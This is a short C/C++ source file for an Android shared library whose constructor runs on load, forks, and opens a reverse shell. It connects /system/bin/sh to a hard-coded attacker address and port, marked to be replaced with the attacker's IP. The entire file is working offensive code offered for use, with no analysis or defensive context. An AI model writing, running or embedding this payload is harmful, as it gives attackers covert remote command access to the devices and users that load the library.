#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>

#define LHOST "10.0.2.15" // Replace with Attacker IP
#define LPORT 4444       // Replace with Attacker Port

extern "C" {
    void payload_execute() __attribute__((constructor));
}

void stealth_connect(const char* ip, int port) {
    int sockfd;
    struct sockaddr_in serv_addr;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
        close(sockfd);
        return;
    }
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sockfd);
        return;
    }
    for (int i = 0; i <= 2; i++) {
        dup2(sockfd, i);
    }

    close(sockfd);

    char *const argv[] = {"/system/bin/sh", (char *)0};
    char *const envp[] = {"PATH=/system/bin:/vendor/bin", (char *)0};

    execve("/system/bin/sh", argv, envp);

    exit(0);
}
void payload_execute() {
    if (fork() != 0) {
        return;
    }
    stealth_connect(LHOST, LPORT);
}
